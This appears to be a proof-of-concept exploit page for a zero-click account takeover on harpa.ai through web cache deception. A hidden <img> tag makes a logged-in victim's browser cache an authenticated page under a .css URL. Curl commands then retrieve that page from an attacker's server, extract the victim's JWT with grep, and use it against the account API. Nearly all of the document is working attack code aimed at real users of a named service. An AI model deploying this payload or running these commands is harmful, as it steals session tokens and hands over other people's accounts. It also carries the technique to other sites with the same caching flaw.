HARPA AI - Zero-Click Account Takeover

Vulnerability: Web Cache Deception (WCD)

Attack Vector: Cloudflare CDN caches authenticated HTML responses when a static file extension (.css, .js, .png, .ico) is appended to library page URLs.

Impact: Any logged-in harpa.ai user who loads a poisoned URL (via hidden <img>, <link>, or <script> on any website) leaks their JWT token into the Cloudflare CDN cache. Attacker retrieves it server-side.

Zero-Click: No user interaction required. The victim only needs to visit any attacker-controlled page.

PHASE 1 — VICTIM'S BROWSER (runs automatically)

When a logged-in harpa.ai user visits this page, hidden resources trigger cache poisoning:

<img src="https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" style="display:none">
Waiting... loading hidden resource with victim's cookies...
PHASE 2 — ATTACKER'S SERVER (run from terminal)

The attacker retrieves the cached page from a different machine (no cookies needed).

CORS blocks browser-to-browser fetch (this is expected). The attacker runs this from their server:

# Step 2a: Fetch cached page and extract JWT
curl -s "https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" | grep -o '"jwt":"[^"]*"'

# Step 2b: Verify cache headers
curl -s -D - "https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" -o /dev/null 2>&1 | grep -iE "cf-cache-status|age:|cache-control"

# Step 2c: Full account takeover with stolen JWT
STOLEN_JWT="PASTE_JWT_HERE"
curl -s "https://api.harpa.ai/api/v1/auth/account?withBalanceAggregated=true" \
  -H "Authorization: Bearer $STOLEN_JWT" \
  -H "Content-Type: application/json"
